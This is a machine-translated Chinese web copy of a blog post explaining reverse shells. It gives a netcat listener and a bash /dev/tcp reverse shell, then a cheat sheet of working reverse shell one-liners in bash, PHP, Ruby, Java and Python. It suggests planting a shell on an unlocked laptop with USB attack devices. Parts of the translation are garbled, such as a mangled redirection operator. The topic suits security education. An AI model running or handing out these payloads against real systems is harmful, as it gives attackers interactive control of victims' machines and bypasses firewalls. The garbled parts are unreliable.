<html>
<head>
<title>Reverse shell !?!</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">反壳！？！</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/reverse-shell-cf154dfee6bd?source=collection_archive---------1-----------------------#2017-08-26">https://medium.com/hackernoon/reverse-shell-cf154dfee6bd?source=collection_archive---------1-----------------------#2017-08-26</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><figure class="fi fk is it iu iv fe ff paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="fe ff ir"><img src="../Images/6709b0065e9749cd856beaa66ea016d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y8OyspWX3Yssig-GXwYEiQ.jpeg"/></div></div></figure><p id="2332" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">什么是反向外壳？你跳上那只乌龟，它会从墙上反弹回来，对吗？</p><p id="795b" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">不完全是，但是，你不是唯一一个无知的人。令人惊讶的是，许多人实际上并不知道什么是反向外壳。长话短说，这是当一台计算机连接到另一台计算机，但发起计算机转发他们的外壳到目的地。在攻击过程中或作为测试的一部分，经常会出现反向外壳。它们是可怕的攻击，因为它在机器上给了攻击者一个交互式外壳，他们不应该访问“硬化”区域的内部。</p><p id="d07f" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">让我们来分析一下这是如何工作的。首先，有一台机器监听某个特定的tcp端口。在这种情况下使用netcat。</p><pre class="ka kb kc kd fq ke kf kg kh aw ki dt"><span id="95b1" class="kj kk hu kf b fv kl km l kn ko">$ nc -vlp 80 <br/>-v, — verbose Set verbosity level (can be used several times); <br/>-l, — listen Bind and listen for incoming connections; <br/>-p, — source-port port Specify source port to use <br/>(<a class="ae kp" href="http://man7.org/linux/man-pages/man1/ncat.1.html" rel="noopener ugc nofollow" target="_blank">http://man7.org/linux/man-pages/man1/ncat.1.html</a>) </span></pre><p id="da2e" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">很简单，只是一个特定端口上的监听器。其次，我们需要另一台机器，即受害者，连接到这台机器，然后将会话转发给它。根据可用的资源，有无数种方法来建立这种连接。这就是bash的用法</p><pre class="ka kb kc kd fq ke kf kg kh aw ki dt"><span id="3a4c" class="kj kk hu kf b fv kl km l kn ko">$ bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span></pre><p id="e782" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">命令<em class="kq"> bash -i &gt; &amp; </em>调用带有“交互式”选项的bash。然后<em class="kq">/dev/tcp/192 . 168 . 1 . 142/7023</em>通过设备文件将该会话重定向到TCP套接字。<br/>最后<em class="kq">0&gt;T15】1</em>取标准输出，并连接到标准输入。</p><p id="1368" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">原来linux已经构建了一个<em class="kq"> /dev/tcp </em>设备文件。虽然这个文件非常强大和有用，但是如果以这种方式使用，它可能会非常危险。这个内置的设备文件让bash可以直接连接到任何ip和任何端口。如果您想确认某个端口是否打开，或者检查时间，这也很有用。</p><pre class="ka kb kc kd fq ke kf kg kh aw ki dt"><span id="64a6" class="kj kk hu kf b fv kl km l kn ko">$ echo &gt; /dev/tcp/192.168.1.142/22 <br/>-bash: connect: Connection refused. ( yey no ssh is open !)</span><span id="b08e" class="kj kk hu kf b fv kr km l kn ko">$ echo &gt; /dev/tcp/<a class="ae kp" href="http://www.google.com/80" rel="noopener ugc nofollow" target="_blank">www.google.com/80</a></span><span id="2529" class="kj kk hu kf b fv kr km l kn ko">$ cat &lt;/dev/tcp/time.nist.gov/13</span><span id="6a14" class="kj kk hu kf b fv kr km l kn ko">57991 17-08-26 13:39:06 50 0 0   0.0 UTC(NIST) *</span></pre><div class="ks kt fm fo ku kv"><a href="http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab ej"><div class="kx ab ky cl cj kz"><h2 class="bd hv fv z el la eo ep lb er et ht dt translated">关于使用Bash内置的/dev/tcp文件(TCP/IP)的更多信息</h2><div class="lc l"><h3 class="bd b fv z el la eo ep lb er et ek translated">如果您看到了昨天的技术技巧，并且正在寻找更多关于将TCP/IP与bash的内置/dev/tcp设备文件一起使用的信息…</h3></div><div class="ld l"><p class="bd b gc z el la eo ep lb er et ek translated">www.linuxjournal.com</p></div></div><div class="le l"><div class="lf l lg lh li le lj ja kv"/></div></div></a></div><p id="1834" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这有什么可怕的？netcat可以监听任何端口，在这个例子中，它监听端口80。这意味着连接和通过该管道的所有流量看起来都像普通的http流量，如果该端口在您的一台主机上打开(通常如此)，那么无论您使用哪种防火墙，都无法阻止反向外壳控制您。随后，它不会阻止防火墙内的一台可以访问互联网的机器<em class="kq">* *咳* *咳</em>笔记本电脑使用允许的端口，然后转到内部局域网上任何可以访问的地方。</p><p id="d849" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">玩反向贝壳真的很有趣，尤其是如果你有一个橡胶鸭子或一只巴什兔子。这样你就可以走到一台不安全的笔记本电脑前(当然，你有合法的权限)窃取一个外壳。然后等你的受害者回来…</p><pre class="ka kb kc kd fq ke kf kg kh aw ki dt"><span id="828a" class="kj kk hu kf b fv kl km l kn ko">$ say “im sorry dave i can’t let you do that, you should have locked your computer"<br/>$ sudo reboot</span></pre><div class="ks kt fm fo ku kv"><a href="https://hakshop.com/collections/usb-rubber-ducky" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab ej"><div class="kx ab ky cl cj kz"><h2 class="bd hv fv z el la eo ep lb er et ht dt translated">USB橡胶鸭子</h2><div class="lc l"><h3 class="bd b fv z el la eo ep lb er et ek translated">编辑描述</h3></div><div class="ld l"><p class="bd b gc z el la eo ep lb er et ek translated">hakshop.com</p></div></div><div class="le l"><div class="lk l lg lh li le lj ja kv"/></div></div></a></div><div class="ks kt fm fo ku kv"><a href="https://hakshop.com/products/bash-bunny" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab ej"><div class="kx ab ky cl cj kz"><h2 class="bd hv fv z el la eo ep lb er et ht dt translated">狂欢兔子</h2><div class="lc l"><h3 class="bd b fv z el la eo ep lb er et ek translated">世界上最先进的USB攻击平台。它打开了攻击面，这在以前是不可能的…</h3></div><div class="ld l"><p class="bd b gc z el la eo ep lb er et ek translated">hakshop.com</p></div></div><div class="le l"><div class="ll l lg lh li le lj ja kv"/></div></div></a></div><p id="dcd6" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">最后，这里有一些例子，允许一个shell在一大堆不同的语言中运行，因为并不是所有的东西都有bash，只是大部分的东西。</p><pre class="ka kb kc kd fq ke kf kg kh aw ki dt"><span id="0783" class="kj kk hu kf b fv kl km l kn ko">Bash<br/>exec 5&lt;&gt;/dev/tcp/192.168.1.142/80<br/>cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done <br/># or:<br/>while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><span id="cb90" class="kj kk hu kf b fv kr km l kn ko">PHP<br/>php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br/>(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)</span><span id="4c22" class="kj kk hu kf b fv kr km l kn ko">RUBY<br/>ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</span><span id="0e3c" class="kj kk hu kf b fv kr km l kn ko">JAVA<br/>r = Runtime.getRuntime()<br/>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.1.142/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done”] as String[])<br/>p.waitFor()</span><span id="ad04" class="kj kk hu kf b fv kr km l kn ko">PYTHON<br/>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</span></pre><div class="ks kt fm fo ku kv"><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab ej"><div class="kx ab ky cl cj kz"><h2 class="bd hv fv z el la eo ep lb er et ht dt translated">反向外壳备忘单</h2><div class="lc l"><h3 class="bd b fv z el la eo ep lb er et ek translated">如果你足够幸运，在渗透测试中发现了一个命令执行漏洞，很快你就会…</h3></div><div class="ld l"><p class="bd b gc z el la eo ep lb er et ek translated">pentestmonkey.net</p></div></div></div></a></div><div class="ks kt fm fo ku kv"><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" rel="noopener  ugc nofollow" target="_blank"><div class="kw ab ej"><div class="kx ab ky cl cj kz"><h2 class="bd hv fv z el la eo ep lb er et ht dt translated">反向外壳备忘单</h2><div class="lc l"><h3 class="bd b fv z el la eo ep lb er et ek translated">反向Shell备忘单，用于连接回的反向Shell列表</h3></div><div class="ld l"><p class="bd b gc z el la eo ep lb er et ek translated">highon .咖啡</p></div></div><div class="le l"><div class="lm l lg lh li le lj ja kv"/></div></div></a></div><figure class="ka kb kc kd fq iv"><div class="bz el l di"><div class="ln lo l"/></div></figure></div></div>    
</body>
</html>